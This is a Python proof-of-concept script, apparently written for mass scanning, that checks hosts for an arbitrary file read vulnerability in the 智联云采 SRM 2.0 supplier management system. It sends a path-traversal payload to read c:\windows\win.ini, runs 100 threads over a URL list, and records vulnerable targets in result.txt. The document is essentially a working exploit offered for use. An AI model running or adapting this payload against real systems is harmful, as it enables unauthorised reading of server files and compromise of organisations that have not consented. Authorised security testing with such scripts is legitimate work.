# SRM 2.0模板
import argparse,requests,os
from multiprocessing.dummy import Pool

# 展示程序的横幅信息
def banner():
    test = """
███████╗██████╗ ███╗   ███╗        ██████╗     ██████╗ 
██╔════╝██╔══██╗████╗ ████║        ╚════██╗   ██╔═████╗
███████╗██████╔╝██╔████╔██║         █████╔╝   ██║██╔██║
╚════██║██╔══██╗██║╚██╔╝██║        ██╔═══╝    ████╔╝██║
███████║██║  ██║██║ ╚═╝ ██║███████╗███████╗██╗╚██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ 
                                   author:MOYV
                                   date:2024-09-2
                                   version:1.0 
"""
    print(test)

# 漏洞检测函数
def poc(target):
    payload = '/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    try:
        res1 = requests.get(url=target, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload, headers=headers,verify=False,timeout=5)
            if '[fonts]' in res2.text:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在任意文件读取\n")
                print(f"[+]{target}存在任意文件读取")
            else:
                print(f"[-]{target}不存在任意文件读取")
        else:
            print(f"[!]{target}可能存在问题，请手工检测")
    except Exception as e:
        print(f"[!]{e}")

def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="智联云采_SRM_2.0_任意文件读取漏洞脚本")
    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parse.parse_args()

    # 对输入进行检查
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.isfile(args.file):
            print(f"[!]{args.file}文件不存在，请检查路径")
            return

        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用 python3 SRM_2.0.py -h 获取帮助")

if __name__ == '__main__':
    main()